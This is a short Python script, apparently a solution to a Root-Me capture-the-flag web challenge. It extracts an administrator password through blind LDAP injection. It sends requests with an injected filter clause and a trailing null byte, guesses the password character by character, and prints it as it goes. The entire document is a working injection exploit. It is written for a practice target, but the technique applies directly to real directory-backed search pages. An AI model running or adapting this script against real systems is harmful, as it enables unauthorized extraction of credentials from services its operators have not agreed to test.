import requests
import string

char = string.ascii_letters + string.digits + "!@$%-()@_{}"
FLAG = ''
while 1:
	lenFlag = len(FLAG)
	for i in char:
		payload = FLAG + i
		url = "http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(sn=admin)(password="+payload+"*))%00"
		r = requests.get(url)
		if "admin" in r.text:
			FLAG = payload
			lenFlag1 = len(FLAG)
			print "password: ", FLAG
			break
	
	if lenFlag == lenFlag1:
		break